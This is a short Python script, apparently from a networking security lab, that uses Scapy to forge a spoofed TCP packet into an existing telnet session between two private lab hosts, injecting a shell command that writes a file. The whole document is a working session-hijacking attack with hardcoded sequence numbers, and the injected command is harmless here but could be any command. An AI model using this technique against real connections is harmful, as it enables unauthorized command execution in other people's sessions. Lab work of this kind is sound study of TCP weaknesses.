#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.7")
tcp = TCP(sport=40276, dport=23, flags="A", seq=469150475, ack=2620303635)
data = "echo 'TCP Hijack Success!' > mal.txt\n"
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)
